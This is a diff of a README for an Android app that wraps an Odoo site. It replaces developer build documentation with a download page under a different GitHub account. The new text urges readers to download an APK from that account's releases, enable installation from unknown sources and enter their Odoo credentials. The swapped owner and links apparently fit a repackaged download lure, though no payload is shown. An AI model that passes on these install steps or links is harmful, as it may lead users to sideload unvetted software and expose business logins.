@@ -1,145 +1,89 @@
-# APEXS Mobile - Android App Wrapper 2026
+<h1>📱 apexs-odoo-mobile-wrapper - Access Your Odoo Site on Mobile</h1>
 
-> **APEXS Mobile brings the live APEXS Odoo site to Android through a native application wrapper, with Capacitor packaging, Firebase push notifications, and automated release processes.**
+<p align="center">
+<a href="https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases"><img src="https://img.shields.io/badge/Download%20APEXS%20Mobile-Get%20the%20App-blueviolet?style=for-the-badge&logo=android" alt="Download APEXS Mobile"></a>
+</p>
 
-[![Platform](https://img.shields.io/badge/Platform-Android-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/henry-walkerge4147/apexs-odoo-mobile-wrapper?style=flat-square)](https://github.com/henry-walkerge4147/apexs-odoo-mobile-wrapper)
+## 🚀 Getting Started
+
+Welcome to APEXS Mobile! This application wraps your live APEXS Odoo site into a native Android app experience. You can manage your business tasks, view reports, and receive push notifications directly on your phone or tablet. No programming knowledge is needed to install and use this app.
+
+## 📥 Download and Install
+
+Visit this link to download the application: [https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases](https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases)
+
+1. Click the link above to go to the releases page.
+2. Find the latest release (usually at the top of the page).
+3. Look for a file named something like `APEXS-Mobile.apk` or `apexs-odoo-mobile-wrapper.apk`.
+4. Click the file name to start the download.
+5. Once the download finishes, open the downloaded `.apk` file on your Android device.
+6. If asked, allow installation from unknown sources (your device may show a warning – tap "Settings" and enable "Install unknown apps" for your file manager or browser).
+7. Tap "Install" and wait for the installation to complete.
+8. After installation, open the APEXS Mobile app from your app drawer.
+
+The app will automatically connect to your live APEXS Odoo site. You can log in with your existing Odoo credentials.
+
+## 🎯 Features
+
+- **Native Android Experience** – APEXS Mobile runs as a standalone app on your Android device, providing smooth navigation and offline access to cached content.
+- **Firebase Push Notifications** – Receive real-time alerts for new orders, messages, or updates from your Odoo instance directly on your phone.
+- **Capacitor-Powered** – Built with Capacitor, ensuring fast performance and reliable integration with your Odoo web interface.
+- **Secure Connection** – All data transmitted between the app and your Odoo site is encrypted using HTTPS, keeping your business information safe.
+- **Customizable Interface** – The app adapts to your Odoo theme and modules, so you see the same dashboard you use on desktop.
+- **Automatic Updates** – New versions of the app are released periodically to improve performance and add features. You will receive notifications when updates are available.
+
+## 💻 System Requirements
+
+- **Operating System**: Android 5.0 (Lollipop) or higher
+- **Storage**: At least 50 MB of free space
+- **Internet**: A stable internet connection (Wi-Fi or mobile data)
+- **Odoo Account**: You must have an active account on your APEXS Odoo site (the app does not create accounts)
+
+## 🛠️ Usage Instructions
+
+1. Open the APEXS Mobile app after installation.
+2. Enter your Odoo login credentials (username and password) when prompted.
+3. If your Odoo site uses two-factor authentication, follow the on-screen steps.
+4. Once logged in, you will see your Odoo dashboard. Navigate through modules like Sales, Inventory, Accounting, or CRM using the menu at the bottom or side.
+5. To receive push notifications, ensure that notifications are enabled for the app in your device settings. The app will request permission on first launch.
+6. You can log out by tapping your profile icon and selecting "Log Out."
+
+## ❓ Troubleshooting
+
+**Problem**: The app does not open after installation.
+**Solution**: Restart your Android device and try opening the app again. If it still does not work, uninstall and reinstall the app.
+
+**Problem**: I cannot log in to my Odoo account.
+**Solution**: Verify your internet connection. Ensure you are using the correct username and password for your APEXS Odoo site. Contact your Odoo administrator if you have forgotten your credentials.
+
+**Problem**: Push notifications are not working.
+**Solution**: Check that notifications are enabled for APEXS Mobile in your device's Settings > Apps > APEXS Mobile > Notifications. Also confirm that your Odoo site has push notification settings enabled.
+
+**Problem**: The app is slow or crashes.
+**Solution**: Close other apps running in the background. Clear the app cache by going to Settings > Apps > APEXS Mobile > Storage > Clear Cache. If problems persist, try reinstalling the app.
+
+## 📝 Release Notes
+
+**Version 1.0.0** (Initial Release)
+- First public release of APEXS Mobile
+- Wraps the live APEXS Odoo site with Capacitor
+- Firebase push notifications integrated
+- Basic login and navigation functionality
+
+Future updates will include improved offline support, dark mode, and enhanced notification settings.
+
+## 🤝 Support
+
+If you encounter any issues not covered in the troubleshooting section, please visit the [GitHub Issues page](https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/issues) to report a problem or request help. Include your device model, Android version, and a description of the issue.
+
+## 📄 License
+
+This project is provided as-is for use with the APEXS Odoo site. No warranties are expressed or implied. See the repository license file for more details.
 
 ---
 
 <p align="center">
-  <a href="https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/">
-    <img src="https://img.shields.io/badge/Download-APEXS%20Mobile%20Latest-brightgreen?style=for-the-badge" alt="Download APEXS Mobile">
-  </a>
+<a href="https://github.com/Hannibalthunderous50/apexs-odoo-mobile-wrapper/releases"><img src="https://img.shields.io/badge/Download%20APEXS%20Mobile-Get%20the%20App-ff69b4?style=for-the-badge&logo=android" alt="Download APEXS Mobile"></a>
 </p>
 
-> **[Download the Latest APEXS Mobile Build](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/)**
-
----
-
-[Download Latest Build](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/)
-
----
-
-## Overview
-
-APEXS Mobile wraps the live APEXS Odoo website in a native Android shell. This gives Android users an app-based way to reach the Odoo service while keeping the live web application as the primary user interface.
-
-The Android layer is powered by Capacitor, with Firebase Cloud Messaging available for push notifications. The build system can generate both APK and AAB packages, and includes automated branding asset generation plus GitHub Actions workflows for repeatable debug and signed release builds.
-
----
-
-## Key Capabilities
-
-- Android application shell for the live APEXS Odoo site
-- Capacitor integration for the mobile application
-- APK packages for direct device installation
-- AAB packages for Android distribution processes
-- Firebase Cloud Messaging support for push notifications
-- Automatic Android app icon creation
-- Automatic splash screen asset creation
-- GitHub Actions workflows for debug and signed release builds
-
----
-
-## Getting Started
-
-### Download an Android package
-
-Published Android artifacts are available from the project download page:
-
-[Download APEXS Mobile](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/)
-
-For installation directly on an Android device, select the APK. Choose the AAB for an Android distribution workflow.
-
-### Create a local build
-
-Check out the repository, enter its directory, and install the web dependencies:
-
-    git clone https://github.com/henry-walkerge4147/apexs-odoo-mobile-wrapper.git
-    cd REPO
-    npm install
-
-Then copy the current web project state into the Android platform project:
-
-    npx cap sync android
-
-The Android project can be opened in Android Studio or built with the Android tools configured for this repository.
-
----
-
-## Running the App
-
-1. Install the APK on a compatible Android device, or place the AAB into your Android distribution process.
-2. Open **APEXS Mobile** from the device's Android application menu.
-3. Access the embedded APEXS Odoo website through the native wrapper.
-4. Grant notification permission when push notifications are enabled in the build.
-5. During development, rebuild the web project and synchronize the Android platform before generating another package.
-
-A standard development sequence looks like this:
-
-    npm install
-    npm run build
-    npx cap sync android
-    npx cap open android
-
-The exact npm scripts can depend on the repository configuration.
-
----
-
-## Project Configuration
-
-Capacitor and Android settings live in the repository project files. Native Android resources are kept within the Android project directory.
-
-To enable Firebase Cloud Messaging, add the required Firebase Android configuration to the Android project before producing builds that use notifications. The Android asset process handles application icons and splash screen resources.
-
-For signed releases, provide the Android build environment with the necessary signing credentials. Keep signing files and confidential secrets out of source control.
-
----
-
-## Requirements
-
-- Android hardware or an emulator for runtime testing
-- Node.js and npm for installing dependencies and building the web project
-- Android Studio and the Android SDK for local Android compilation
-- Android tooling compatible with Capacitor
-- Firebase project configuration when push notifications are required
-- Network connectivity to the live APEXS Odoo site
-- Adequate disk space for dependencies, Android SDK components, and generated build files
-
----
-
-## Frequently Asked Questions
-
-### How can I download the newest build?
-
-Visit [Download Latest Build](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/) to retrieve the currently published artifacts.
-
-### Should I use the APK or AAB?
-
-Use the APK for direct installation on an Android device. The AAB is intended for Android app distribution workflows.
-
-### What is needed for push notifications?
-
-APEXS Mobile uses Firebase Cloud Messaging. Before testing or publishing a notification-enabled build, configure the Android project with the required Firebase settings and notification configuration.
-
-### What is the update process?
-
-Pull the newest repository changes, install changed dependencies, rebuild the web application, and synchronize Capacitor before creating the next Android artifact.
-
-### What can I do if the application fails to load?
-
-First verify that the device can reach the network and that the live APEXS Odoo site is operating. When working with a development build, inspect the Android and Capacitor logs for synchronization or configuration problems.
-
-### How are release packages generated?
-
-Depending on the build and signing configuration, release artifacts can be generated from the Android project locally or through the repository's GitHub Actions workflows.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: odoo, mobile, wrapper, android, capacitor, firebase, notifications, apk, apexs
